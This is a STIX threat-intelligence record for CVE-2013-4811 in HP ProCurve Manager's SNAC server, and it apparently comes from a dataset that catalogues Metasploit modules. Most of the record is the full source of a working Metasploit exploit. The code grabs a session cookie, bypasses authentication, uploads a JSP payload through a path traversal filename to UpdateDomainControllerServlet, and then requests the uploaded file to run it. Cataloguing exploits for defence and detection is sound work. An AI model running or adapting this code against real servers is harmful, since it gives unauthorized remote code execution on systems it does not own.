{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5bf8846-e040-4ab6-92d5-08387faf3c4a",
    "created": "2024-08-14T16:55:01.631371Z",
    "modified": "2024-08-14T16:55:01.631374Z",
    "name": "HP ProCurve Manager SNAC UpdateDomainControllerServlet File Upload",
    "description": " This module exploits a path traversal flaw in the HP ProCurve Manager SNAC Server. The vulnerability in the UpdateDomainControllerServlet allows an attacker to upload arbitrary files, just having into account binary writes aren't allowed. Additionally, authentication can be bypassed in order to upload the file. This module has been tested successfully on the SNAC server installed with HP ProCurve Manager 4.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_pcm_snac_update_domain.rb",
            "external_id": "hp_pcm_snac_update_domain.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4811"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP ProCurve Manager SNAC UpdateDomainControllerServlet File Upload',\n      'Description'    => %q{\n        This module exploits a path traversal flaw in the HP ProCurve Manager SNAC Server. The\n        vulnerability in the UpdateDomainControllerServlet allows an attacker to upload arbitrary\n        files, just having into account binary writes aren't allowed. Additionally, authentication\n        can be bypassed in order to upload the file. This module has been tested successfully on\n        the SNAC server installed with HP ProCurve Manager 4.0.\n      },\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-4811' ],\n          [ 'OSVDB', '97154' ],\n          [ 'BID', '62349' ],\n          [ 'ZDI', '13-226' ]\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Arch'           => ARCH_JAVA,\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe',\n          'SSL' => true\n        },\n      'Targets'        =>\n        [\n          [ 'HP ProCurve Manager 4.0 SNAC Server', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-09-09'))\n\n    register_options(\n      [\n        Opt::RPORT(443)\n      ])\n  end\n\n  def check\n    session = get_session\n    if session.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    res = send_request_cgi({\n      'uri' => \"/RegWeb/RegWeb/GetDomainControllerServlet\",\n      'cookie' => session\n    })\n\n    if res and res.code == 200 and res.body =~ /domainName/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def get_session\n    res = send_request_cgi({ 'uri' => \"/RegWeb/html/snac/index.html\" })\n    session = nil\n    if res and res.code == 200\n      session = res.get_cookies\n    end\n\n    if session and not session.empty?\n      return session\n    end\n\n    return nil\n  end\n\n  def exploit_upload(session)\n    jsp_name = \"#{rand_text_alphanumeric(8+rand(8))}.jsp\"\n    post_message = Rex::MIME::Message.new\n    post_message.add_part(payload.encoded, \"application/octet-stream\", nil, \"form-data; name=\\\"adCert\\\"; filename=\\\"\\\\../#{jsp_name}\\\"\")\n    post_message.add_part(\"{}\", nil, nil, \"form-data; name=\\\"ad_data\\\"\")\n    post_message.add_part(\"add\", nil, nil, \"form-data; name=\\\"ad_action\\\"\")\n    data = post_message.to_s\n\n    res = send_request_cgi(\n      {\n        'uri'    => \"/RegWeb/RegWeb/UpdateDomainControllerServlet\",\n        'method' => 'POST',\n        'ctype'    => \"multipart/form-data; boundary=#{post_message.bound}\",\n        'cookie' => session,\n        'data'    => data,\n      })\n\n    if res and res.code == 200 and res.body =~ /success:false/\n      return jsp_name\n    end\n\n    return nil\n  end\n\n  def exploit\n    print_status(\"Getting a valid session...\")\n    session = get_session\n    if session.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to get a valid session\")\n    end\n\n    print_status(\"Uploading payload...\")\n    jsp = exploit_upload(session)\n    unless jsp\n      fail_with(Failure::NotVulnerable, \"#{peer} - Upload failed\")\n    end\n\n    print_status(\"Executing payload...\")\n    send_request_cgi({ 'uri' => \"/RegWeb/#{jsp}\" })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-09",
    "x_mitre_platforms": [
        "win'"
    ]
}